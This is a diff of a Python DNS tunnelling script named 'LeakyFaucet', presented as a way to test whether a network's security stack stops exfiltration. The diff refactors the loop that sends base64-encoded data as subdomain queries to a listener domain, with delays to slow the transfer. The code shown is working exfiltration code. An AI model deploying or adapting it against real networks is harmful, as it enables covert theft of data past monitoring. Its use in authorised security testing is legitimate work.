@@ -1,6 +1,6 @@
-#LeakyFaucet v1.04.1
+#LeakyFaucet v1.05.0
 #Written: Mr.Waterhouse
-#May 1, 2023
+#May 14, 2023
 #
 #This DNS tunnelling script created as part of a fun little side project. It is designed to quickly test if DNS tunnelling is possible
 #in the environment. Simply put, is your existing security stack doing what it is supposed to do? It will attempt to exfiltrate the following:
@@ -27,6 +27,29 @@ import socket
 import base64
 import dns.resolver
 import sys
+
+#Define the DNS Sender function
+def send_query():
+    #Loop to run DNS queries over a period of 20 seconds per query.
+    for value in dns_data:
+        dns_query = value + '.' + listener_domain
+        print('Performing NSLOOKUP type=TXT for:', dns_query)
+        try:
+            answers = dns.resolver.resolve(dns_query, 'TXT')
+            for rdata in answers:
+                for txt_string in rdata.strings:
+                    print(txt_string.decode('utf-8'))
+        except dns.resolver.NXDOMAIN:
+            print('The domain you specified does not exist.')       #Domain name does not exist
+        except dns.resolver.NoAnswer:
+            print('Checking my pockets for data.')         			#No TXT records found
+        except dns.exception.Timeout:
+            print('I fell asleep waiting for a server reply.')      #DNS query timed out
+        except dns.resolver.NoNameservers:
+            print('No name server found.')         					#No name servers found
+        
+        time.sleep(20)                  							#set this timer to a larger value (in seconds) to slow the drip rate
+
 
 # Generate a random 5-digit number to act as session id. This is required by the listener in order to differentiate traffic from multiple
 #users.
@@ -64,23 +87,6 @@ for i in range(len(dns_data)):
         print('Encoded ', encoded_value)
         dns_data[i] = encoded_value
 
-#Loop to run DNS queries over a period of 20 seconds per query.
-for value in dns_data:
-    dns_query = value + '.' + listener_domain
-    print('Performing NSLOOKUP type=TXT for:', dns_query)
-    try:
-        answers = dns.resolver.resolve(dns_query, 'TXT')
-        for rdata in answers:
-            for txt_string in rdata.strings:
-                print(txt_string.decode('utf-8'))
-    except dns.resolver.NXDOMAIN:
-        print('The domain you specified does not exist.')       #Domain name does not exist
-    except dns.resolver.NoAnswer:
-        print('Checking my pockets for data.')         			#No TXT records found
-    except dns.exception.Timeout:
-        print('I fell asleep waiting for a server reply.')      #DNS query timed out
-    except dns.resolver.NoNameservers:
-        print('No name server found.')         					#No name servers found
-        
-    time.sleep(20)                  							#set this timer to a larger value (in seconds) to slow the drip rate
+send_query()
+
 print("Session ID: " + str(ranNum))
